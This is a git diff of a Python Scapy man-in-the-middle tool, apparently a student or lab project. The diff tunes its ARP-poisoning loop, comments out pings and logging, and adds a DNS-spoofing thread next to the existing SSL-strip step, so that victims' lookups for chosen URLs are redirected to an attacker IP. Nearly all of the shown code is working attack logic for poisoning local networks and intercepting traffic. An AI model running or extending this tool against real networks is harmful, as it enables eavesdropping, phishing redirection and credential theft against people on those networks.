@@ -1,7 +1,3 @@
-<<<<<<< HEAD
-=======
-#from click import option
->>>>>>> ac6bb8ff9b73dfd1629edcfa01557e23dbd719e5
 from scapy.all import *
 from ipaddress import ip_address
 load_layer("http") 
@@ -10,6 +6,7 @@ load_layer("dns")
 import time
 import argparse
 import packet_sniffer
+import dns_spoofing
 import ssl_strip
 
 import threading
@@ -35,7 +32,7 @@ def get_arguments():
 
     parser.add_argument("-o", "--oneway", dest="oneway", action="store_true", help="Do not poison gateways")
 
-    parser.add_argument("-d", "--dns", dest="dns-spoof", action='store_true', help="use this argument if you want to use dns-spoof")
+    parser.add_argument("-d", "--dns", dest="dns_spoof", action='store_true', help="use this argument if you want to use dns-spoof")
     parser.add_argument("-u", "--url", dest="urls", nargs="+", help="Array of URLs to spoof with as last item the the ip to redirect to")
 
     parser.add_argument("-s", "--ssl", dest="ssl_strip", action='store_true', help="use this argument if you want to use ssl-strip")
@@ -84,7 +81,7 @@ def forge_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
 def arp_poison(targets, gateways):
  while True:
     try:
-        print("[*] Sending ARP poison packets...") if options.verbose else 0
+        # print("[*] Sending ARP poison packets...") if options.verbose else 0
         
         for victim_address in targets:
             for from_address in gateways:
@@ -92,26 +89,28 @@ def arp_poison(targets, gateways):
                     print("[*] Skipping same IPs...") if options.verbose else 0
                     continue
 
-                icmp = forge_l2_ping(from_address.ip, victim_address.ip, victim_address.mac)
-                sendp(icmp, iface=options.iface, verbose=options.verbose)
-                if(not options.oneway):
-                    icmpM = forge_l2_ping(victim_address.ip, from_address.ip, from_address.mac)
-                    sendp(icmpM, iface=options.iface, verbose=options.verbose)
+                # icmp = forge_l2_ping(from_address.ip, victim_address.ip, victim_address.mac)
+                # sendp(icmp, iface=options.iface, verbose=options.verbose)
+
+                # if(not options.oneway):
+                #     icmpM = forge_l2_ping(victim_address.ip, from_address.ip, from_address.mac)
+                #     sendp(icmpM, iface=options.iface, verbose=options.verbose)
 
                 # Create ARP poison packet to send all packets from from_address to this pc if packet is for victim
                 arp = forge_arp(victim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
-                sendp(arp, iface=options.iface, verbose=options.verbose)
+                sendp(arp, iface=options.iface, verbose=False)
 
                 arp[ARP].op = 1
-                sendp(arp, iface=options.iface, verbose=options.verbose)
+                sendp(arp, iface=options.iface, verbose=False)
+                
                 if(not options.oneway):
                     arpM = forge_arp(from_address.ip, victim_address.ip, victim_address.mac, ATTACKER_MAC, 2)
-                    sendp(arpM, iface=options.iface, verbose=options.verbose)
+                    sendp(arpM, iface=options.iface, verbose=False)
 
                     arpM[ARP].op = 1
-                    sendp(arpM, iface=options.iface, verbose=options.verbose)
+                    sendp(arpM, iface=options.iface, verbose=False)
                 
-        print("[*] end of ARP storm...")  if options.verbose else 0
+        # print("[*] end of ARP storm...")  if options.verbose else 0
     except Exception as e:
         print(e, traceback.format_exc())
         sys.exit(0)
@@ -172,16 +171,26 @@ def main():
     
 
     #use daemon=True to run in background and stop when application quits
-    poison_thread =  threading.Thread(target=arp_poison, args=(targets, gateways), daemon=True).start()
-    poison_confirm_thread = threading.Thread(target=poison_confirm, args=(targets, gateways), daemon=True).start()
+    threading.Thread(target=arp_poison, args=(targets, gateways), daemon=True).start()
+    threading.Thread(target=poison_confirm, args=(targets, gateways), daemon=True).start()
 
     time.sleep(ARP_POISON_WARM_UP)
 
+    vic = targets + gateways
+    attacker = type('obj', (object,), {"mac": ATTACKER_MAC, "ip": ATTACKER_IP})
+
+    if options.dns_spoof:
+        print("[*] Starting DNS spoofing thread...")
+        if(options.urls.__len__() < 2):
+            print("[!] Error: You need to specify at least 1 URL and 1 IP")
+            sys.exit(0)
+
+        dns_spoof_args = dns_spoofing.DnsSpoofArgs(options.urls[0:-1], options.urls[-1])
+        packet_sniffer.main(dns_spoofing.check_packet, vic, attacker, gateways[0], options, dns_spoof_args)
+
     if(options.ssl_strip):
         print("[*] Starting SSL strip thread...")
-        vic = targets + gateways
-
-        packet_sniffer.main(ssl_strip.check_packet, vic, ATTACKER_MAC, options)
+        packet_sniffer.main(ssl_strip.check_packet, vic, gateways[0], attacker, options, None)
 
     # wait for ctrl+c to exit application
     try: 
